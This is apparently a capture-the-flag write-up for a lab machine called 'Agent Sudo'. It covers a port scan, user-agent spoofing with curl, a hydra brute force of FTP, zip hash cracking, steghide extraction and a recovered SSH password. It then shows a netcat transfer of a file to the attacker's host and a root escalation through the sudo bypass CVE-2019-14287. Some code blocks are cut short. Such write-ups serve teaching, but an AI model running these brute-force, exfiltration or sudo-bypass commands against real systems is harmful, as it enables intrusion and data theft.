# Agent Sudo - Writeup

Mom, I think there are aliens outside...

Released: 2024-03-4


## Nmap

```bash
â”Œâ”€â”€(vipinã‰¿vipin)-[~]
â””â”€$ sudo nmap -sS -sV 10.10.137.85
[sudo] password for vipin:

- 3 open ports: 21, 22 and 80.

## Enumeration cont'd

- To access to the secret page, we need to modify the **user-agent** using cURL. I used the command ```curl -A <useragent> 10.10.137.85 -L``` and trying *R* as a user agent shows this.

![Image showing result of R](blog/agentsudopics/useragentcurl.png 'Fig.1')
<div style={{ textAlign: 'center' }}>
  <small>Fig.1</small>
</div>

- When we try *C* as a user agent we get this...

![Image showing result of C](blog/agentsudopics/chris.png 'Fig.2')
<div style={{ textAlign: 'center' }}>
  <small>Fig.2</small>
</div>

- From *Fig.2*, we know Agent C's name is Chris and that his password is weak (not actually "weak").

## Hash cracking and Brute-forcing

- I cracked the FTP Password for the server using the command ```hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.194.92 -V```.

![Image showing ftp cracked](blog/agentsudopics/ftpcracked.png 'Fig.3')
<div style={{ textAlign: 'center' }}>
  <small>Fig.3 *Cracked FTP Password*</small>
</div>

- We can login using ```ftp user@ip```. Inside FTP, we find a *.txt* file that reads...

```txt
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

- Let's also ```get``` the other images. If we ***Binwalk*** *cutie.png*, we find a password-protected *.zip* file inside.

```bash
â”Œâ”€â”€(vipinã‰¿vipin)-[~/Downloads]
â””â”€$ zip2john 8702.zip > 8702.hash

Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

- Inside the password-protected *.zip* file is a TXT file named *To_agentR.txt* and inside is this...

```txt
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

- It seem like *"QXJlYTUx"* is encoded in Base64.

```bash
â”Œâ”€â”€(vipinã‰¿vipin)-[~/Downloads]
â””â”€$ echo 'QXJlYTUx' | base64 -d
Area51           
```

- Could this be the *StegHide* password for *cute-alien.jpg*?

```bash
â”Œâ”€â”€(vipinã‰¿vipin)-[~]
â””â”€$ steghide --extract -p Area51 -sf cute-alien.jpg
wrote extracted data to "message.txt".
```

- It was!!!


```bash
â”Œâ”€â”€(vipinã‰¿vipin)-[~]
â””â”€$ cat message.txt                                                                   
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

- Wow, we know know agent J's password. Let's try to *ssh* with the password we aquired.

## Capture the user flag

```bash

> What is the incident of the photo called?

- Since we cannot view images in the Terminal, let's try to transfer the file to my VM.

```bash
james@agent-sudo:~$ nc -w 5 10.6.22.229 6969 < /home/james/Alien_autospy.jpg

# on another window

â”Œâ”€â”€(vipinã‰¿vipin)-[~/Desktop]
â””â”€$ nc -lvnp 6969 > Alien_autopsy.jpg
```

- With Google Images I performed a reverse image search on the image. I didn't specifically find a result from Fox News, but other articles and news said some guy named Roswel faked an alien autopsy. If we combined what we learned from the articles, we find that the answer is ***roswell alien autopsy***.

## Privilege escalation

> It's the most wonderful time of the Machineeeeeee ðŸŽ¶

- We start by running ```find / -uid 0 -perm -4000 -type f 2>/dev/null``` to find exploitable SUID Binaries and funnily `sudo` seems to be one.

```bash
james@agent-sudo:~$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

- A little searching find us [this](https://www.exploit-db.com/exploits/47502) exploit which tells us the CVE is **CVE-2019-14287** and how to privilege escalate with this exploit!

```bash
james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~# cat /root/root.txt
